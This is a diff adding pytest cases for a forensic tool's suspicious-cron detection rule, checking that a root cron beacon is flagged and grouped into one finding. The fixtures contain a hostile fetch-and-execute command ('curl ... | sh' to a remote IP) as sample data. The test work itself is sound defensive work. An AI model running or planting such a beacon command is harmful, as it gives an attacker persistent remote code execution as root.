@@ -15,7 +15,7 @@ owner can edit it. The same command recorded by two parsers is one finding.
 import pytest
 
 from lfa import db
-from lfa.rules.execution import SuspiciousProcessRule
+from lfa.rules.execution import SuspiciousCronRule, SuspiciousProcessRule
 
 
 def run_rule(conn, rule, ctx=None):
@@ -259,4 +259,100 @@ def test_repeated_command_spans_first_and_last_timestamp(tmp_path, event_factory
     f = hits[0]
     assert f.first_ts_utc == "2024-03-14T02:20:00+00:00"
     assert f.last_ts_utc == "2024-03-14T09:45:00+00:00"
+    conn.close()
+
+
+# --- suspicious_cron: a malicious cron beacon scores on its own -------------
+# On a host with no auditd and a non-interactive cron shell, the cron entry and
+# the cron execution log are the ONLY record a root beacon ran. persistence_
+# after_login needs a login anchor; this rule covers the standalone case.
+
+def _cron_cmd_event(event_factory, cmd, **over):
+    """What cronlog_parser writes for a suspicious cron execution: raw_line is
+    the bare command, offset points inside the file."""
+    kw = dict(
+        category="persistence",
+        subcategory="suspicious_cron_command",
+        description=f"Suspicious command executed by cron as root: {cmd} -- pipes to shell",
+        raw_line=cmd,
+        actor_user="root",
+        actor_process="cron",
+        source_artifact_path="var/log/syslog",
+        parser_name="cronlog_parser",
+        severity="high",
+    )
+    kw.update(over)
+    return event_factory(**kw)
+
+
+def _cron_job_event(event_factory, cmd, **over):
+    """What cron_parser writes for a suspicious cron entry (state finding, no ts)."""
+    kw = dict(
+        category="persistence",
+        subcategory="suspicious_cron_job",
+        description=f"Suspicious cron job in etc/cron.d/lfa_beacon: schedule * * * * * runs as root: {cmd}",
+        raw_line=cmd,
+        actor_user="root",
+        source_artifact_path="etc/cron.d/lfa_beacon",
+        parser_name="cron_parser",
+        event_kind="state_finding",
+        timestamp_utc=None, timestamp_local=None, timestamp_confidence="unknown",
+        severity="high",
+    )
+    kw.update(over)
+    return event_factory(**kw)
+
+
+def test_cron_beacon_flagged_without_login_anchor(tmp_path, event_factory):
+    conn = db.open_case(tmp_path / "c.db")
+    cmd = "curl -s http://203.0.113.9/beacon | sh"
+    db.insert_events(conn, [
+        _cron_job_event(event_factory, cmd, raw_line_offset=1),
+        _cron_cmd_event(event_factory, cmd, raw_line_offset=2,
+                        timestamp_utc="2024-03-14T02:15:00+00:00"),
+    ])
+    hits = run_rule(conn, SuspiciousCronRule())
+    assert len(hits) == 1, [h.title for h in hits]
+    f = hits[0]
+    assert f.rule_name == "suspicious_cron"
+    assert f.severity == "high"
+    assert f.plain.confidence == "High"          # curl|sh matches the malicious shape
+    assert "curl -s http://203.0.113.9/beacon | sh" in f.title
+    assert "cron" in f.plain.why_it_matters
+    # both the scheduled entry and the execution are cited
+    assert len(f.event_ids) == 2
+    conn.close()
+
+
+def test_cron_beacon_repeated_executions_are_one_finding(tmp_path, event_factory):
+    # cron ran the beacon every minute -> many events, one finding spanning them.
+    conn = db.open_case(tmp_path / "c.db")
+    cmd = "curl -s http://203.0.113.9/beacon | sh"
+    db.insert_events(conn, [
+        _cron_cmd_event(event_factory, cmd, raw_line_offset=i,
+                        timestamp_utc=f"2024-03-14T02:1{i}:00+00:00")
+        for i in range(3)
+    ])
+    hits = run_rule(conn, SuspiciousCronRule())
+    assert len(hits) == 1
+    f = hits[0]
+    assert len(f.event_ids) == 3
+    assert f.first_ts_utc == "2024-03-14T02:10:00+00:00"
+    assert f.last_ts_utc == "2024-03-14T02:12:00+00:00"
+    conn.close()
+
+
+def test_benign_cron_not_scored_by_suspicious_cron(tmp_path, event_factory):
+    # ordinary cron jobs are subcategory 'cron_job'/'cron_command', which this
+    # rule does not read - only the parser-flagged 'suspicious_*' ones.
+    conn = db.open_case(tmp_path / "c.db")
+    db.insert_events(conn, [
+        event_factory(subcategory="cron_job", category="persistence",
+                      actor_user="root", source_artifact_path="etc/crontab",
+                      raw_line="/usr/bin/backup.sh", raw_line_offset=1,
+                      event_kind="state_finding", timestamp_utc=None,
+                      timestamp_local=None, timestamp_confidence="unknown",
+                      severity="info"),
+    ])
+    assert run_rule(conn, SuspiciousCronRule()) == []
     conn.close()
